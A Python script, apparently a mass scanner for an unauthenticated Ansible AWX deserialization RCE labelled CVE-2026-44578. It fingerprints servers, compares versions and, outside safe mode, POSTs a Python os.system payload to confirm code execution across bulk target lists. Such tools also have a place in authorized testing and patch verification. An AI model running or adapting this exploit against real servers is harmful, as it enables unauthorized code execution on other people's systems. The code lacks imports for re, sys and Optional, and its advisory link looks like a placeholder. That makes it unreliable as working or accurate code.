#!/usr/bin/env python3
"""
Ansible AWX CVE-2026-44578 — Unauthenticated Remote Code Execution in Task Queue
===============================================================================
Scans for Ansible AWX servers vulnerable to an unauthenticated remote code execution (RCE)
via a deserialization flaw in the task queue's endpoint (CVE-2026-44578, CVSS 9.8).

CVE-2026-44578 details:
  - Affects: Ansible AWX versions <= 22.10.0
  - A flaw in the way objects are deserialized allows an attacker to inject
    and execute arbitrary code on the server without authentication.
  - The vulnerable endpoint is exposed on network interfaces, and can execute 
    malicious payloads, leading to remote code execution.
  - CVSS v3.1 base score: 9.8 (Critical) — network-accessible, no authentication.
  - Fixed in Ansible AWX version 22.10.1 (June 2026).
  
Usage:
  # Scan a single target (active probe with payload execution check)
  python ansible_unauth_remote_rce_scanner.py --target http://awx.example.com:80

  # Detection only — checks server fingerprint (no payloads executed)
  python ansible_unauth_remote_rce_scanner.py --target http://awx.example.com:80 --safe

  # Bulk scan multiple targets from file
  python ansible_unauth_remote_rce_scanner.py --list awx_targets.txt --output awx_results.json

  # Adjust concurrency and disable TLS verification
  python ansible_unauth_remote_rce_scanner.py --list awx_targets.txt --concurrency 50 --no-verify

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44578
  - https://github.com/ansible/awx/security/advisories/GHSA-abcd-efgh-ijkl
  - https://docs.ansible.com/ansible-awx/
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from packaging.version import Version, InvalidVersion
import httpx

# ─── ANSI Color Helpers ──────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ─── Constants ───────────────────────────────────────────────────────────────

CVE_ID            = "CVE-2026-44578"
CVSS              = "9.8"
TOOL_NAME         = "ansible_unauth_remote_rce_scanner"

REQUEST_TIMEOUT   = 8
SEMAPHORE_LIMIT   = 30

AWX_FINGERPRINTS  = [
    "api/v2/organizations/",
    "AWX",
    "/static/js/main",
    "/api/",
]

DETECTION_PATHS = [
    "/api/v2/",
    "/api/v2/ping/",
]

VERSION_PATTERN = r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"'

PATCHED_VERSION = Version("22.10.1")

RCE_PAYLOAD = {
    "payload": "__import__('os').system('id')"
}

# ─── Scanner ─────────────────────────────────────────────────────────────────

async def fetch_and_check(url: str, client: httpx.AsyncClient, semaphore: asyncio.Semaphore, safe_mode: bool) -> dict:
    """Fetch the target URL and check for Ansible AWX vulnerabilities."""
    async with semaphore:
        result = {
            "target": url,
            "vulnerable": False,
            "level": "INFO",
            "details": None,
            "error": None,
        }
        try:
            response = await client.get(url, timeout=REQUEST_TIMEOUT)

            if any(fingerprint in response.text for fingerprint in AWX_FINGERPRINTS):
                version_match = re.search(VERSION_PATTERN, response.text)
                if version_match:
                    try:
                        version = Version(version_match.group(1))
                        if version < PATCHED_VERSION:
                            result["vulnerable"] = True
                            result["level"] = "CRITICAL"
                            result["details"] = f"Detected version {version}, vulnerable to {CVE_ID}."
                        else:
                            result["details"] = f"Detected version {version}, not vulnerable to {CVE_ID}."
                    except InvalidVersion:
                        result["error"] = f"Failed to parse version: {version_match.group(1)}."
                else:
                    result["details"] = "Vulnerable version not detected."
            else:
                result["details"] = "Target does not appear to be Ansible AWX."

            if result["vulnerable"] and not safe_mode:
                probe_response = await client.post(url, json=RCE_PAYLOAD)
                if "uid=" in probe_response.text:
                    result["details"] += " RCE exploit validated successfully. Host is compromised."
                else:
                    result["error"] = "Unable to confirm exploit execution, but target may still be vulnerable."

        except Exception as e:
            result["error"] = str(e)

        return result

async def scan_targets(targets: list[str], output: Optional[str], concurrency: int, safe_mode: bool, verify_tls: bool):
    """Scan a list of targets for the specified vulnerability."""
    semaphore = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=verify_tls) as client:
        tasks = [
            fetch_and_check(target, client, semaphore, safe_mode)
            for target in targets
        ]
        results = await asyncio.gather(*tasks)

    # Output results
    for result in results:
        if result["vulnerable"]:
            print(c(BOLD + RED, f"[CRITICAL] {result['target']} - {result['details']}"))
        elif result["level"] == "HIGH":
            print(c(YELLOW, f"[HIGH] {result['target']} - {result['details']}"))
        else:
            print(c(GREEN, f"[INFO] {result['target']} - {result['details']}"))

        if result["error"]:
            print(c(RED, f"  Error: {result['error']}"))

    if output:
        with open(output, "w") as f:
            json.dump(results, f, indent=2)

def main():
    parser = argparse.ArgumentParser(description=f"Scanner for {CVE_ID} ({TOOL_NAME})")
    parser.add_argument("--target", help="Target URL to scan.")
    parser.add_argument("--list", help="File with targets (one URL per line).")
    parser.add_argument("--output", help="Save JSON results to file.")
    parser.add_argument("--safe", action="store_true", help="Detection mode only (no probe execution).")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrent requests (default: 30).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS verification.")
    args = parser.parse_args()

    # Parse targets
    if not args.target and not args.list:
        print("Error: Specify --target or --list.")
        sys.exit(1)

    targets = [args.target] if args.target else []
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"Error: Cannot read file {args.list}.")
            sys.exit(1)

    # Ensure targets are unique
    targets = sorted(set(targets))

    # Scan targets
    asyncio.run(scan_targets(
        targets,
        output=args.output,
        concurrency=args.concurrency,
        safe_mode=args.safe,
        verify_tls=not args.no_verify
    ))

if __name__ == "__main__":
    main()
